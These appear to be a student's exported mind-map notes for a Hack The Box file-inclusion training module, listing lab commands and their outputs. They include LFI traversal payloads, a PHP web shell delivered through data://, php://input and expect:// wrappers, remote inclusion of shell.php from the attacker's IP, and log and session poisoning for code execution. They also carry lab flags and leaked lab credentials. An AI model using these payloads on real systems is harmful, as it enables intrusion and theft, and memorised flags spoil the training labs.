---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "2"
module: "File Inclusion"
output_topics: 50
---

# File Inclusion — Outputs 001–050

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

Return to [[Outputs/Modules/File Inclusion Outputs|File Inclusion output index]].

## Outputs

> [!output]+ 🟨 Output 001
> root:x:..
>
> **Source path:** File Inclusion → Basic LFI → change the parameter from es to /etc/passwd → root:x:..
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 113e6b12-2d0b-40a8-afd7-44eeccb720a2 -->

> [!output]+ 🟨 Output 002
> error
>
> **Source path:** File Inclusion → Basic LFI → Filename Prefix → include("lang_" . $_GET['language']); → the final string would be lang_../../../etc/passwd → error
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e8f9d464-06f1-470c-a78f-7219ae8ef544 -->

> [!output]+ 🟨 Output 003
> barry
>
> **Source path:** File Inclusion → Basic LFI → LAB → Using the file inclusion find the name of a user on the system that starts with "b". → change the language to spanish → http://154.57.164.69:31844/index.php?language=/../../../../../../etc/passwd → barry
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: bc565797-351e-4061-8373-0a2ee99fb035 -->

> [!output]+ 🟨 Output 004
> HTB{n3v3r_tru$t_u$3r_!nput}
>
> **Source path:** File Inclusion → Basic LFI → LAB → Submit the contents of the flag.txt file located in the /usr/share/flags directory. → Submit the contents of the flag.txt file located in the /usr/share/flags directory. → http://154.57.164.69:31844/index.php?language=/../../../../../../usr/share/flags/flag.txt → HTB{n3v3r_tru$t_u$3r_!nput}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e5253c2b-9bfd-410f-a2aa-e491d4c82040 -->

> [!output]+ 🟨 Output 005
> ....//....//....//....//etc/passwd [Status: 200, Size: 3641
>
> **Source path:** File Inclusion → Basic Bypasses → LAB → The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt → ffuf -u http://154.57.164.72:30741/index.php?language=languages/FUZZ -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 2306 → ....//....//....//....//etc/passwd [Status: 200, Size: 3641
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4161b341-214b-4c8c-be81-bfe9a01ffc3d -->

> [!output]+ 🟨 Output 006
> root:x:..
>
> **Source path:** File Inclusion → Basic Bypasses → LAB → The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt → ffuf -u http://154.57.164.72:30741/index.php?language=languages/FUZZ -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 2306 → ....//....//....//....//etc/passwd [Status: 200, Size: 3641 → http://154.57.164.72:30741/index.php?language=languages/....//....//....//....//etc/passwd → root:x:..
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1850f4c2-73e5-45e4-8e17-f7dd1f7158b0 -->

> [!output]+ 🟨 Output 007
> HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}
>
> **Source path:** File Inclusion → Basic Bypasses → LAB → The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt → ffuf -u http://154.57.164.72:30741/index.php?language=languages/FUZZ -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 2306 → ....//....//....//....//etc/passwd [Status: 200, Size: 3641 → http://154.57.164.72:30741/index.php?language=languages/....//....//....//....//etc/passwd → root:x:.. → ?language=languages/....//....//....//....//flag.txt → HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 36357468-49c9-413f-b34e-67d56c23f56f -->

> [!output]+ 🟨 Output 008
> index 200
> config 302
>
> **Source path:** File Inclusion → PHP Filters → Fuzzing for PHP Files → ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/FUZZ.php → index 200 config 302
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: df27aee6-472e-46a0-a04d-172e2eb650c8 -->

> [!output]+ 🟨 Output 009
> empty result
>
> **Source path:** File Inclusion → PHP Filters → Standard PHP Inclusion → ?language=config → (.php extension appended by web application) → empty result
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4d38bf5d-cfd3-402d-b1e7-d1a1069237c5 -->

> [!output]+ 🟨 Output 010
> PD9waHAK...SNIP...KICB9Ciov
>
> **Source path:** File Inclusion → PHP Filters → Source Code Disclosure → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=config → PD9waHAK...SNIP...KICB9Ciov
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4f64f839-6338-4725-a7a0-553586f7449a -->

> [!output]+ 🟨 Output 011
> configure               [Status: 302]
>
> **Source path:** File Inclusion → PHP Filters → LAB → Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer → ffuf -u http://154.57.164.74:30466/FUZZ.php -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt → configure               [Status: 302]
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 207ae03f-874f-43e9-81d4-decd7e64d35d -->

> [!output]+ 🟨 Output 012
> PD9waHA....
>
> **Source path:** File Inclusion → PHP Filters → LAB → Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer → ffuf -u http://154.57.164.74:30466/FUZZ.php -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt → configure               [Status: 302] → http://154.57.164.74:30466/index.php?language=php://filter/read=convert.base64-encode/resource=configure → PD9waHA....
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6eb4683f-faee-4509-8990-23640432c019 -->

> [!output]+ 🟨 Output 013
> &lt;?php
>
> if ($_SERVER['REQUEST_METHOD'] == 'GET' &amp;&amp; realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
>   header('HTTP/1.0 403 Forbidden', TRUE, 403);
>   die(header('location: /index.php'));
> }
>
> $config = array(
>   'DB_HOST' =&gt; 'db.inlanefreight.local',
>   'DB_USERNAME' =&gt; 'root',
>   'DB_PASSWORD' =&gt; 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
>   'DB_DATABASE' =&gt; 'blogdb'
> );
>
> $API_KEY = "Awew242GDshrf46+35/k";
>
> **Source path:** File Inclusion → PHP Filters → LAB → Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer → ffuf -u http://154.57.164.74:30466/FUZZ.php -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt → configure               [Status: 302] → http://154.57.164.74:30466/index.php?language=php://filter/read=convert.base64-encode/resource=configure → PD9waHA.... → echo 'PD9waH...' | base64 -d → &lt;?php  if ($_SERVER['REQUEST_METHOD'] == 'GET' &amp;&amp; realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {   header('HTTP/1.0 403 Forbidden', TRUE, 403);   die(header('location: /index.php')); }  $config = array(   'DB_HOST' =&gt; 'db.inlanefreight.local',   'DB_USERNAME' =&gt; 'root',   'DB_PASSWORD' =&gt; 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',   'DB_DATABASE' =&gt; 'blogdb' );  $API_KEY = "Awew242GDshrf46+35/k";
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: aa8c2474-d092-4f49-937d-596d15669b65 -->

> [!output]+ 🟨 Output 014
> W1BIUF0KCjs7Ozs7Ozs7O..
>
> **Source path:** File Inclusion → RCE via PHP Wrappers → Data wrapper → use cURL or Burp → curl "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" → W1BIUF0KCjs7Ozs7Ozs7O..
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 80714ae9-2cc9-4b7b-a34f-d944173cd9d6 -->

> [!output]+ 🟨 Output 015
> allow_url_include = On
>
> **Source path:** File Inclusion → RCE via PHP Wrappers → Data wrapper → use cURL or Burp → decode it and grep for allow_url_include to see its value → echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include → allow_url_include = On
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 113b3b23-41fc-49cc-b312-0e220c85ca47 -->

> [!output]+ 🟨 Output 016
> PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
>
> **Source path:** File Inclusion → RCE via PHP Wrappers → Data wrapper → Remote Code Execution → encode a basic PHP web shell → echo '&lt;?php system($_GET["cmd"]); ?&gt;' | base64 → PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ae4f5702-c859-4336-8693-5a24acf8bf32 -->

> [!output]+ 🟨 Output 017
> uid=33(www-data)
>
> **Source path:** File Inclusion → RCE via PHP Wrappers → Data wrapper → pass it to the data wrapper use pass commands to the web shell with &amp;cmd=&lt;COMMAND&gt;: → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id → uid=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1dce6ac5-42a6-450f-87b7-c42d0c4ffee8 -->

> [!output]+ 🟨 Output 018
> uid=33(www-data)
>
> **Source path:** File Inclusion → RCE via PHP Wrappers → Input → The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST → the vulnerable parameter must accept POST → curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id" | grep uid → uid=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3e560dfc-0bd5-4415-97f1-ba17d06090f8 -->

> [!output]+ 🟨 Output 019
> extension=expect
>
> **Source path:** File Inclusion → RCE via PHP Wrappers → Expect → decode configuration file and check whether it is configured → echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect → extension=expect
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2e9c0bbb-0953-40fb-9ff6-d3e930b9ca12 -->

> [!output]+ 🟨 Output 020
> uid=33(www-data)
>
> **Source path:** File Inclusion → RCE via PHP Wrappers → Expect → decode configuration file and check whether it is configured → echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect → extension=expect → curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id" | grep uid → uid=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 702b1db7-c08f-4228-8ac6-bf56d8843a7a -->

> [!output]+ 🟨 Output 021
> W1BIUF0KCjs7Ozs7Ozs7O..
>
> **Source path:** File Inclusion → RCE via PHP Wrappers → LAB → Try to gain RCE using one of the PHP wrappers and read the flag at / → Get the php.ini source code → curl "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" → W1BIUF0KCjs7Ozs7Ozs7O..
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5423f5f4-55ed-42e2-95f1-37940bd3b595 -->

> [!output]+ 🟨 Output 022
> allow_url_include = On
>
> **Source path:** File Inclusion → RCE via PHP Wrappers → LAB → Try to gain RCE using one of the PHP wrappers and read the flag at / → Get the php.ini source code → curl "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" → W1BIUF0KCjs7Ozs7Ozs7O.. → echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include → allow_url_include = On
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7fe9b5b7-0cc8-43b9-a99c-b1202bbf5ccd -->

> [!output]+ 🟨 Output 023
> ...
> uid=33(www-data)
> ...
>
> **Source path:** File Inclusion → RCE via PHP Wrappers → LAB → Try to gain RCE using one of the PHP wrappers and read the flag at / → RCE → curl '154.57.164.67:31250/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id' → ... uid=33(www-data) ...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d47444a7-79d3-46a6-9416-6bec9f73b28b -->

> [!output]+ 🟨 Output 024
> 37809e2f8952f06139011994726d9ef1.txt
>
> **Source path:** File Inclusion → RCE via PHP Wrappers → LAB → Try to gain RCE using one of the PHP wrappers and read the flag at / → RCE → curl '154.57.164.67:31250/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id' → ... uid=33(www-data) ... → curl '154.57.164.67:31250/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=ls+/' → 37809e2f8952f06139011994726d9ef1.txt
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1f75ceeb-f7c3-411e-803a-cd9cbe4687d9 -->

> [!output]+ 🟨 Output 025
> HTB{d!$46l3_r3m0t3_url_!nclud3}
>
> **Source path:** File Inclusion → RCE via PHP Wrappers → LAB → Try to gain RCE using one of the PHP wrappers and read the flag at / → RCE → curl '154.57.164.67:31250/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id' → ... uid=33(www-data) ... → curl '154.57.164.67:31250/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=ls+/' → 37809e2f8952f06139011994726d9ef1.txt → curl '154.57.164.67:31250/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=cat+/37809e2f8952f06139011994726d9ef1.txt' → HTB{d!$46l3_r3m0t3_url_!nclud3}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8da8a5e6-f1df-40f6-9a2c-eae7ede1e151 -->

> [!output]+ 🟨 Output 026
> uid=33
>
> **Source path:** File Inclusion → Remote File Inclusion (RFI) → Remote Code Execution with RFI → creating a malicious script in the language of the web application → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id → uid=33
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: fd994542-2e2e-494c-8f41-224400ac8263 -->

> [!output]+ 🟨 Output 027
> uid=33(www-data)
>
> **Source path:** File Inclusion → Remote File Inclusion (RFI) → FTP → If the server requires valid authentication, then the credentials can be specified in the URL → curl 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://user:pass@&lt;OUR_IP&gt;/shell.php&amp;cmd=id' → uid=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9fba5082-a2f0-4a29-acc3-b4e554022fb1 -->

> [!output]+ 🟨 Output 028
> NT AUTHORITY\IUSR
>
> **Source path:** File Inclusion → Remote File Inclusion (RFI) → SMB (Windows server) → include our script by using a UNC path → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\\&lt;OUR_IP&gt;\share\shell.php&amp;cmd=whoami → NT AUTHORITY\IUSR
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3c498df9-e3d9-4cfb-93e7-e89ec76dc15f -->

> [!output]+ 🟨 Output 029
> 99a8fc05f033f2fc0cf9a6f9826f83f4
>
> **Source path:** File Inclusion → Remote File Inclusion (RFI) → LAB → Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in / → http://10.129.29.114/index.php?language=http://10.10.14.4:443/shell.php&amp;cmd=cat+/exercise/flag.txt → 99a8fc05f033f2fc0cf9a6f9826f83f4
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4302be3a-e34e-4b1f-a1b7-a84adad621f3 -->

> [!output]+ 🟨 Output 030
> GIF8uid=33
>
> **Source path:** File Inclusion → LFI and File Uploads → PHP → PHP code should get executed → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./profile_images/shell.gif&amp;cmd=id → GIF8uid=33
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: aa7b4c5b-b85f-421a-9253-9eb0b5299a84 -->

> [!output]+ 🟨 Output 031
> uid=33
>
> **Source path:** File Inclusion → LFI and File Uploads → Zip Upload → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id → uid=33
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0f4a52c0-cb97-47ea-ae5f-2f1ee09f3d8e -->

> [!output]+ 🟨 Output 032
> uid=33
>
> **Source path:** File Inclusion → LFI and File Uploads → Phar Upload → upload it to the web application, we can simply call it with phar:// → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id → uid=33
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8b18f4f9-06ce-460d-8e68-38880650db58 -->

> [!output]+ 🟨 Output 033
> HTB{upl04d+lf!+3x3cut3=rc3}
>
> **Source path:** File Inclusion → LFI and File Uploads → LAB → Use any of the techniques covered in this section to gain RCE and read the flag at / → http://154.57.164.70:30183/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=cat+/2f40d853e2d4768d87da1c81772bae0a.txt → HTB{upl04d+lf!+3x3cut3=rc3}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9225a643-64db-4fef-8738-369f8a312580 -->

> [!output]+ 🟨 Output 034
> page|s:6:"en.php";preference|s:7:"English";
> Notice: Undefined variable: p2 in /var/www
> /html/index.php on line 51
>
> **Source path:** File Inclusion → Log Poisoning → examine our PHPSESSID session file → it should be stored at → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd → page|s:6:"en.php";preference|s:7:"English"; Notice: Undefined variable: p2 in /var/www /html/index.php on line 51
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 85c5a29f-483f-4b25-8b73-19df3eef813c -->

> [!output]+ 🟨 Output 035
> page|s: 17:"session_poisoning"; preference|s:7:"Spanish";
> Notice: Undefined variable: p2 in /var/www
> /html/index.php on line 51
>
> **Source path:** File Inclusion → Log Poisoning → examine our PHPSESSID session file → it should be stored at → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd → page|s:6:"en.php";preference|s:7:"English"; Notice: Undefined variable: p2 in /var/www /html/index.php on line 51 → contains two values: → page → is under our control → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=session_poisoning → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd → page|s: 17:"session_poisoning"; preference|s:7:"Spanish"; Notice: Undefined variable: p2 in /var/www /html/index.php on line 51
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a1417259-5f9f-4ee4-aaf2-34c36815a10d -->

> [!output]+ 🟨 Output 036
> page|s:30:"uid=33(www-data) gid=33(www-
> data) groups=33(www-data),4(adm)
> ";preference|s:7:"Spanish";
> Notice: Undefined variable: p2 in /var/www
> /html/index.php on line 51
>
> **Source path:** File Inclusion → Log Poisoning → examine our PHPSESSID session file → writing PHP code to the session file → check the session with adding ?cmd=id → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id → page|s:30:"uid=33(www-data) gid=33(www- data) groups=33(www-data),4(adm) ";preference|s:7:"Spanish"; Notice: Undefined variable: p2 in /var/www /html/index.php on line 51
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 11cf2456-4ec2-4420-9cef-4006edaff03c -->

> [!output]+ 🟨 Output 037
> Apache Log Poisoning
>
> **Source path:** File Inclusion → Log Poisoning → Server Log Poisoning → try including the Apache access log → modify the User-Agent → through Burp → User-Agent: Apache Log Poisoning → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/log/apache2/access.log → Apache Log Poisoning
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 792acd76-2427-4706-b930-71e733aa625e -->

> [!output]+ 🟨 Output 038
> Apache Log Poisoning
>
> **Source path:** File Inclusion → Log Poisoning → Server Log Poisoning → try including the Apache access log → modify the User-Agent → through Burp → through Burp → User-Agent: Apache Log Poisoning → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/log/apache2/access.log → Apache Log Poisoning
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ec8c4a8a-45e2-4b71-bcb5-eb924c9f49b4 -->

> [!output]+ 🟨 Output 039
> uid=33(www-data)
>
> **Source path:** File Inclusion → Log Poisoning → Server Log Poisoning → try including the Apache access log → execute this code → GET /index.php?language=/var/log/apache2/access.log&amp;cmd=id → uid=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 130bd289-e33f-4196-9c22-fb696bfe5f5b -->

> [!output]+ 🟨 Output 040
> selected_language|s:29:"/var/www/html ";preference|s:7:"Spanish";
>
> **Source path:** File Inclusion → Log Poisoning → LAB → Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd → writing PHP code to the session file → check the session with adding ?cmd=pwd → http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=pwd → selected_language|s:29:"/var/www/html ";preference|s:7:"Spanish";
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8e4a9e65-a97e-4f28-b459-d7cd9b1ecb43 -->

> [!output]+ 🟨 Output 041
> c85ee5082f4c723ace6c0796e3a3db09.txt
>
> **Source path:** File Inclusion → Log Poisoning → LAB → Try to use a different technique to gain RCE and read the flag at / → http://154.57.164.83:31973/index.php?language=/var/lib/php/sessions/sess_r544nollof6bjnon94sf8kt8qi&amp;cmd=ls+/ → c85ee5082f4c723ace6c0796e3a3db09.txt
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1c599c26-c0a1-4a73-b02f-42f5e8e620da -->

> [!output]+ 🟨 Output 042
> HTB{1095_5#0u1d_n3v3r_63_3xp053d}
>
> **Source path:** File Inclusion → Log Poisoning → LAB → Try to use a different technique to gain RCE and read the flag at / → http://154.57.164.83:31973/index.php?language=/var/lib/php/sessions/sess_r544nollof6bjnon94sf8kt8qi&amp;cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt → HTB{1095_5#0u1d_n3v3r_63_3xp053d}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0f040f72-5517-4cf9-989a-c216046ff6b8 -->

> [!output]+ 🟨 Output 043
> language
>
> **Source path:** File Inclusion → Automated Scanning → Fuzzing Parameters → fuzz for exposed parameters → ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287 → language
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2d0898eb-69f3-4fd2-9114-a19ffc6e6ff2 -->

> [!output]+ 🟨 Output 044
> /var/www/html/
>
> **Source path:** File Inclusion → Fuzzing Server Files → Server Webroot → https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt → ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287 → /var/www/html/
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f97fc623-58d8-4410-9923-ecd4eddb4654 -->

> [!output]+ 🟨 Output 045
> DocumentRoot /var/www/html
> ErrorLog ${APACHE_LOG_DIR}/error.log
> CustomLog ${APACHE_LOG_DIR}/access.log combined
>
> **Source path:** File Inclusion → Fuzzing Server Files → Server Logs/Configurations → webroot path → curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../etc/apache2/apache2.conf → DocumentRoot /var/www/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a0ad0046-0c5a-4648-8e46-2aea4cd8220b -->

> [!output]+ 🟨 Output 046
> export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
>
> **Source path:** File Inclusion → Fuzzing Server Files → Server Logs/Configurations → webroot path → curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../etc/apache2/envvars → export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 50714f9b-5549-4d43-a302-7d6e725ccfce -->

> [!output]+ 🟨 Output 047
> view
>
> **Source path:** File Inclusion → Fuzzing Server Files → LAB → Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt → parameter fuzzing on /index.php → ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://154.57.164.65:32714/index.php?FUZZ=value' -fs 2309 → view
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: eb22666f-3e13-4093-a9d3-5904e3c4d803 -->

> [!output]+ 🟨 Output 048
> ../../../../../../../../../../../../../../../../../../../../../etc/passwd
>
> **Source path:** File Inclusion → Fuzzing Server Files → LAB → Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt → LFI wordlist on parameter → ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.65:32714/index.php?view=FUZZ' -fs 193 → ../../../../../../../../../../../../../../../../../../../../../etc/passwd
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ae6fbe20-e83c-4425-89dd-6a622f10b7fd -->

> [!output]+ 🟨 Output 049
> root:x:
>
> **Source path:** File Inclusion → Fuzzing Server Files → LAB → Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt → LFI wordlist on parameter → ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.65:32714/index.php?view=FUZZ' -fs 193 → ../../../../../../../../../../../../../../../../../../../../../etc/passwd → http://154.57.164.65:32714/index.php?view=../../../../../../../../../../../../../../../../../../../../../etc/passwd → root:x:
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6e1e54af-dfd8-459f-aa6b-2d1cf61bde82 -->

> [!output]+ 🟨 Output 050
> HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}
>
> **Source path:** File Inclusion → Fuzzing Server Files → LAB → Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt → get the flag → http://154.57.164.65:32714/index.php?view=../../../../../../../../../../../../../../../../../../../../../flag.txt → HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 75a9f12a-0447-430b-b53d-cb5bfefbacf2 -->
